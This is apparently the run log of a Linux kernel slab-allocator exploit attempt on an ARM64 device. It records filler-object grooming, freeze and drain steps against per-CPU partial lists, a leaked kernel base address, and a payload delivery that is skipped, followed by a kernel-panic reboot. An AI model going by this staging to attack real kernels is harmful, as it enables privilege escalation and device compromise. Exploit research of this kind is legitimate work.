+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=3 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=4 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=5 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=6 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=7 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=8 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=9 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=10 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=11 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=12 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=13 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=14 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=15 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=16 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=17 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=18 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=19 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=20 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=21 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=22 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=23 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=24 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=25 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=26 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=27 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=28 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=29 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=30 role=filler allocated_at_freeze=yes allocated_at_sample=yes free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=0 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_COST slots=31 loop_us=162653 sample_us=22767
+[*] KS_FILL_DELTA fillers=31 active=2656->2656 d_active=0 d_num=0 d_slabs=0 page_was_full=1
+[*] KS_FREEZE fillers=31 target_pid=12612 cpu=0 empty_cpu=1
+[*] KS_CTL_FREEZE fillers=31 kept_pid=12644 cpu=0
+[*] KS_FREEZE_WAIT ms=2 cpu=0
+[*] KS_FREEZE_SAMPLE active=2656 num=2656 slabs=83 pre_active=1616
+[*] KS_EMPTY_PLAN cpu=1 expect=1
+[*] KS_DRAIN pushes=128 need=5 cpu=0
+[*] KS_DRAIN_BASE active=2464 num=2624 slabs=82
+[*] KS_FREE_CPU pid=12612 cpu=1 expect=1 ok=1
+[*] KS_QUIESCE active=2464 num=2624 slabs=82 stable=1 window=gate
+[*] KS_POSTDRAIN_SAMPLE active=2463 num=2624 slabs=82
+[*] KS_DRAIN d=128 pid=-1 cpu=-1->-1 pobjects=128 limit=6 cross=1 empty=1 stage=after_unfreeze
+[*] KS_EMPTYING kind=target-exit draining_cpu=1 cpu=1->1 page=n_partial expect=discard
+[*] KS_SAMPLE1 tag=crossing active=2464 num=2624 slabs=82
+[*] KS_SAMPLE2 tag=empty active=2463 num=2624 slabs=82
+[*] KS_CTL_TIGHT us=5498 active=2462 num=2592 slabs=81 d_active=-1 d_num=-32 d_slabs=-1 discarded=1 state=listed-discarded
+[*] KS_BRANCH tag=control basis=cache-wide d_active=-1 d_num=-32 d_slabs=-1 paths=discard paths_src=consistent-with listed_signature=1 inuse_at_free=1 inuse_src=derived(page-emptied) residual=none control=not-run gap_us=-1
+[*] KS_SETTLE ms=50 active=2462 num=2592 slabs=81 d_from_empty=-1/-32/-1 d_from_ctl=0/0/0
+[*] KS_DRAIN_RESULT fed=128 crossed=1 crossed_at=128 target=1 pobjects=128 limit=6 min_partial=5
+[*] KS_GATE span_ok=1 crossed_at=128 min_partial=5 empty_cpu=1 registered=1 discarded=0 image=3 gap_ms=0.057 d_empty=-1 d_num=0 d_slabs=0 pin_bad=0 slot_partial=0 preconditions=0
+[*] KS_ID_ROW window=f0cf5e9a-26855883 slot=31 role=target allocated_at_freeze=yes allocated_at_sample=unavailable free_observed=yes addr=unavailable(no-per-object-address) addr_src=none addr_unique=none geom=1024/32/8/32768 page=unresolved(no-object-address) page_src=none offset=unavailable(no-object-address) slot_in_page=unavailable(no-object-address) slot_src=none constructed_slot=1 match=unavailable page_identity=unresolved(no-object-address) d_active=-1 d_num=0 d_slabs=0 d_src=measured delta_attribution=consistent-with
+[*] KS_ID_SUMMARY window=f0cf5e9a-26855883 slots=32 rows=32 addressed=1 page_known=1 unresolved=31 invalid_geometry=0 duplicate_addresses=0 pages_observed=1 distinct_pages=unavailable(pages=1-of-32) objects_per_page=unavailable(incomplete) co_residency=unavailable(reason=addressed-too-few) geom=1024/32/8/32768 geom_src=measured(slabinfo) occupancy=unavailable(no-page-resolved-source)
+[*] KS_BRANCH tag=anchor basis=cache-wide d_active=-1 d_num=0 d_slabs=0 paths=listed,emptied-refused paths_src=consistent-with listed_signature=1 inuse_at_free=unavailable inuse_src=unavailable(page-inuse-not-exposed) residual=listed:>=2,emptied-refused:1 control=discard gap_us=5498
+[*] KS_RESULT verified=address,anchor,transition unverified=reclamation,identity,consumption base=ffffffc255930000
+[*] KS_TARGET_FREE waited_ms=20 iso=1616/1984/62 gate=2464/2624/82 post=2462/2592/81 crossed_at=128
+[*] KS_TARGET_REASON base_page=gate-failed cpu=1 crossed_at=128
+[*] KS_EMPTY_FREE kind=target-exit cpu=1->1 draining=1 ok=1
+[*] MMSLAB post-drain active_objs=2462 num_objs=2592 slabdata=81
+[*] KS_DISCARD post active_objs=2462 num_objs=2592 slabdata=81
+[*] KS_STATE stage=gate outcome=refused samples=2 missing=0 report=1 cleanup=skipped refusal=gate-preconditions base=ffffffc255930000
+[!] KS_DELIVERY skipped=1 reason=gate-preconditions base=ffffffc255930000
+payload_exit=255 at 2026-11-03T17:46:37-06:00
+DEVICE=ALIVE bootreason_after=kernel_panic,null
+LOG=/home/ubuntu/runs/20261103_173750.log
